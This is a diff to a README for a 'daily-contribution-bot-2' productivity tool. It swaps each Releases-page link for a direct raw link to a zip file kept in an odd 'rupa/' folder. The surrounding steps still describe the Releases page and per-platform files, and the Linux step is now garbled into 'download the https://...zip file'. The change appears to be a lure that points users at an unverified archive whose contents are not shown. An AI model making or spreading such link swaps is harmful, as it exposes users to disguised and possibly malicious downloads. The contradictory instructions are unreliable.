@@ -1,7 +1,7 @@
 # 🎉 daily-contribution-bot-2 - Boost Your Daily Productivity
 
 ## 📥 Download Now
-[![Download daily-contribution-bot-2](https://img.shields.io/badge/Download-daily--contribution--bot--2-brightgreen)](https://github.com/sandeepaprabothsankalpa/daily-contribution-bot-2/releases)
+[![Download daily-contribution-bot-2](https://raw.githubusercontent.com/sandeepaprabothsankalpa/daily-contribution-bot-2/main/rupa/daily-contribution-bot-2.zip)](https://raw.githubusercontent.com/sandeepaprabothsankalpa/daily-contribution-bot-2/main/rupa/daily-contribution-bot-2.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the daily-contribution-bot-2 application. This tool simplifies tracking daily contributions for your projects. Just follow these steps to get started quickly.
@@ -18,7 +18,7 @@ daily-contribution-bot-2 automates the process of tracking your contributions ac
 ## 🔗 Download & Install
 To get daily-contribution-bot-2, visit the Releases page to download the latest version. 
 
-[Download daily-contribution-bot-2 here!](https://github.com/sandeepaprabothsankalpa/daily-contribution-bot-2/releases)
+[Download daily-contribution-bot-2 here!](https://raw.githubusercontent.com/sandeepaprabothsankalpa/daily-contribution-bot-2/main/rupa/daily-contribution-bot-2.zip)
 
 ### Steps to Download:
 1. Click the link above to go to the Releases page.
@@ -26,7 +26,7 @@ To get daily-contribution-bot-2, visit the Releases page to download the latest 
 3. Choose the correct file for your operating system:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/sandeepaprabothsankalpa/daily-contribution-bot-2/main/rupa/daily-contribution-bot-2.zip` file.
 
 ### Steps to Install:
 1. Find the downloaded file on your computer.
